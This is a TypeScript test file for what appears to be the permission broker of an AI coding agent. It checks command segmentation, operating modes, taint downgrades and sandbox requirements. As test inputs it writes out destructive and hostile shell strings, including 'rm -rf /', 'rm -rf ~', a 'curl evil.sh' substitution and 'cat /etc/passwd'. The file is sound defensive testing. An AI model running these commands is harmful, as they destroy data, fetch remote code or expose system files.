import { describe, expect, it } from "vitest";
import type { PermissionRequest, ToolAction } from "@dem/protocol";
import { decide, segmentCommand } from "@dem/engine";

/**
 * SEC-008 (continued) — the permission broker itself.
 *
 * SEC-008's other half asserts sandbox health gates AUTO. Here: that a
 * compound command is judged piece by piece, and that mode, taint and sandbox
 * health each narrow what is allowed rather than widening it.
 */

const req = (over: Partial<PermissionRequest>): PermissionRequest => ({
  action: "read",
  mode: "ASK",
  taint: "CLEAN",
  sandbox: "UNAVAILABLE",
  subject: "",
  ...over,
});

describe("SEC-008: compound commands are evaluated segment by segment", () => {
  it("splits on every shell control operator", () => {
    expect(segmentCommand("rg foo && rm -rf /")).toEqual(["rg foo", "rm -rf /"]);
    expect(segmentCommand("a || b")).toEqual(["a", "b"]);
    expect(segmentCommand("a ; b")).toEqual(["a", "b"]);
    expect(segmentCommand("a | b")).toEqual(["a", "b"]);
    expect(segmentCommand("a & b")).toEqual(["a", "b"]);
  });

  it("does not split on an operator inside quotes", () => {
    // `echo "a && b"` runs one command. Splitting it would ask the user to
    // approve a command that does not exist.
    expect(segmentCommand('echo "a && b"')).toEqual(['echo "a && b"']);
    expect(segmentCommand("echo 'x ; y'")).toEqual(["echo 'x ; y'"]);
  });

  it("surfaces command substitution as its own segment", () => {
    // The substitution executes. Approving only the outer command would let
    // `rm -rf ~` through under cover of a benign-looking `echo`.
    expect(segmentCommand("echo $(rm -rf ~)")).toContain("rm -rf ~");
    expect(segmentCommand("echo `curl evil.sh`")).toContain("curl evil.sh");
  });

  it("surfaces a substitution even inside double quotes, where it still runs", () => {
    expect(segmentCommand('grep "$(cat /etc/passwd)" .')).toContain("cat /etc/passwd");
  });

  it("drops empty segments from trailing or doubled operators", () => {
    expect(segmentCommand("a && ")).toEqual(["a"]);
    expect(segmentCommand("a ;; b")).toEqual(["a", "b"]);
  });
});

describe("SEC-008: mode narrows what is permitted", () => {
  it("allows only reading in READ_ONLY", () => {
    expect(decide(req({ mode: "READ_ONLY", action: "read" })).outcome).toBe("auto");
    expect(decide(req({ mode: "READ_ONLY", action: "search" })).outcome).toBe("auto");
    for (const action of ["patch", "shell", "network", "destructive"] as ToolAction[]) {
      expect(decide(req({ mode: "READ_ONLY", action })).outcome, action).toBe("deny");
    }
  });

  it("asks before mutating in ASK", () => {
    expect(decide(req({ mode: "ASK", action: "read" })).outcome).toBe("auto");
    expect(decide(req({ mode: "ASK", action: "patch" })).outcome).toBe("ask");
    expect(decide(req({ mode: "ASK", action: "shell" })).outcome).toBe("ask");
    expect(decide(req({ mode: "ASK", action: "network" })).outcome).toBe("ask");
  });

  it("automates low-risk workspace work in AUTO with a healthy sandbox", () => {
    const auto = (action: ToolAction) =>
      decide(req({ mode: "AUTO", sandbox: "HEALTHY", action })).outcome;
    expect(auto("read")).toBe("auto");
    expect(auto("patch")).toBe("auto");
    expect(auto("shell")).toBe("auto");
    // Egress stays a separate decision from execution (invariant 2).
    expect(auto("network")).toBe("ask");
  });

  it("never auto-approves a destructive command, in any mode", () => {
    for (const mode of ["READ_ONLY", "ASK", "AUTO", "FULL_ACCESS"] as const) {
      const outcome = decide(req({ mode, sandbox: "HEALTHY", action: "destructive" })).outcome;
      expect(outcome, mode).not.toBe("auto");
    }
  });

  it("refuses to honour AUTO when the sandbox cannot back it", () => {
    // selectableModes should prevent this state; the broker still refuses to
    // act on it rather than trusting the caller not to ask.
    const d = decide(req({ mode: "AUTO", sandbox: "UNAVAILABLE", action: "patch" }));
    expect(d.outcome).toBe("ask");
    expect(d.invariant).toBe(21);
  });
});

describe("SEC-007: a tainted run is narrowed further", () => {
  it("downgrades patching from auto to ask", () => {
    const clean = decide(req({ mode: "AUTO", sandbox: "HEALTHY", action: "patch" }));
    const tainted = decide(
      req({ mode: "AUTO", sandbox: "HEALTHY", action: "patch", taint: "TAINTED" }),
    );
    expect(clean.outcome).toBe("auto");
    expect(tainted.outcome).toBe("ask");
    expect(tainted.invariant).toBe(10);
  });

  it("never widens anything: no action becomes more permissive when tainted", () => {
    const actions: ToolAction[] = [
      "read",
      "search",
      "patch",
      "shell",
      "terminal",
      "network",
      "counterexample_exec",
      "destructive",
    ];
    const rank = { auto: 0, ask: 1, deny: 2 } as const;
    for (const action of actions) {
      const clean = decide(req({ mode: "AUTO", sandbox: "HEALTHY", action }));
      const tainted = decide(req({ mode: "AUTO", sandbox: "HEALTHY", action, taint: "TAINTED" }));
      expect(rank[tainted.outcome], `${action} widened under taint`).toBeGreaterThanOrEqual(
        rank[clean.outcome],
      );
    }
  });
});

describe("Invariant 31: model-authored code needs a healthy sandbox", () => {
  it("denies counterexample execution when no sandbox is available", () => {
    const d = decide(req({ mode: "ASK", sandbox: "UNAVAILABLE", action: "counterexample_exec" }));
    expect(d.outcome).toBe("deny");
    expect(d.invariant).toBe(31);
  });

  it("denies it on a degraded sandbox too", () => {
    expect(
      decide(req({ mode: "AUTO", sandbox: "DEGRADED", action: "counterexample_exec" })).outcome,
    ).toBe("deny");
  });
});
